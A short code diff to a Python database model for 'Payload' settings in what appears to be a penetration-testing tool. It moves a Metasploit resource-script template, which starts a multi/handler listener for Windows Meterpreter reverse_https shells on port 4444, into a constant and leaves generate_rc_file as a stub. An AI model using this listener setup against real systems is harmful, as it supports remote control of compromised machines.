@@ -8,14 +8,22 @@ Created on Mar 12, 2012
 
 from models import dbsession
 from sqlalchemy import Column, ForeignKey
-from sqlalchemy.types import String
+from sqlalchemy.types import String, Integer
 from models.BaseObject import BaseObject
 
+RC_TEMPLATE = '''
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+'''
 
 class Payload(BaseObject):
-	''' Payload settings '''
+    ''' Payload settings '''
 
-    user_id = Column(Integer, 
+    user_id = Column(Integer,
         ForeignKey('user.id'), 
         nullable=False
     )
@@ -33,14 +41,7 @@ class Payload(BaseObject):
         return dbsession.query(cls).filter_by(id=sid).first()
 
     def generate_rc_file(self):
-    	'''
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 0.0.0.0
-set LPORT 4444
-set ExitOnSession false
-exploit -j
-'''
+        pass
 
     def __str__(self):
     	return self.msfpayload
